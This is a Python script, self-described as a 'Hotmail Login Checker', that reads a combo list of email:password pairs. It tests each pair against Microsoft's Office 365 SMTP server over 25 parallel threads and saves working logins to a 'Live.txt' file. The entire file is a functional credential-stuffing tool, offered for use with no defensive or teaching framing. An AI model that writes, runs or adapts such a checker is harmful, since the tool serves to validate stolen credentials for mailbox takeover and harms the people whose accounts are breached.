import smtplib
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style

# Initialize colorama
init()

wolf_ascii = """
░█████╗░░█████╗░░█████╗░░█████╗░██╗░░░░░
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░░░░░
██║░░╚═╝██║░░██║██║░░╚═╝██║░░██║██║░░░░░
██║░░██╗██║░░██║██║░░██╗██║░░██║██║░░░░░
╚█████╔╝╚█████╔╝╚█████╔╝╚█████╔╝███████╗
░╚════╝░░╚════╝░░╚════╝░░╚════╝░╚══════╝ Hotmail Login Checker By Cocolcyber
"""

def checker(data):
    try:
        user, pwd = data.split(':')
        mailserver = smtplib.SMTP('smtp.office365.com', 587)
        mailserver.ehlo()
        mailserver.starttls()
        mailserver.login(user, pwd)
        mailserver.quit()
        print(Fore.GREEN + u"LIVE => " + user + u":" + pwd + Style.RESET_ALL)  # Print successful attempt in green
        save_to_file(u"LIVE => " + user + u":" + pwd, 'Live.txt')  # Save LIVE to Live.txt
    except ValueError:
        print(Fore.RED + u"Invalid data format: {}".format(data) + Style.RESET_ALL)  # Print invalid data format in red
        save_to_file(u"Invalid data format: {}".format(data), 'Bad.txt')  # Save invalid data to Bad.txt
    except smtplib.SMTPAuthenticationError:
        print(Fore.RED + u"BAD => Authentication failed for {}".format(data) + Style.RESET_ALL)  # Print authentication failure in red
        save_to_file(u"BAD => Authentication failed for {}".format(data), 'Bad.txt')  # Save BAD to Bad.txt
    except Exception as e:
        print(Fore.RED + u"Exception occurred for {}: {}".format(data, str(e)) + Style.RESET_ALL)  # Print other exceptions in red
        save_to_file(u"Exception occurred for {}: {}".format(data, str(e)), 'Bad.txt')  # Save exception to Bad.txt

def save_to_file(content, file_name):
    with open(file_name, 'a+', encoding='utf-8') as file:
        file.write(content + '\n')

if __name__ == "__main__":
    print(wolf_ascii)
    print("remove any links from the combo, only email:pass\n")

    # Check Python version and use appropriate input function
    if sys.version_info[0] < 3:
        input_function = raw_input
    else:
        input_function = input

    file_name = input_function("Enter Your combo Name: ")  # Prompt user for combo file

    try:
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as file:
            TEXTList = file.read().splitlines()

        # Use ThreadPoolExecutor for parallel processing
        with ThreadPoolExecutor(max_workers=25) as executor:
            futures = [executor.submit(checker, line) for line in TEXTList]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as exc:
                    print(Fore.RED + u"Generated an exception: {}".format(exc) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + "Failed to make process:", str(e) + Style.RESET_ALL)

    input_function("Done Selesai Check.....")
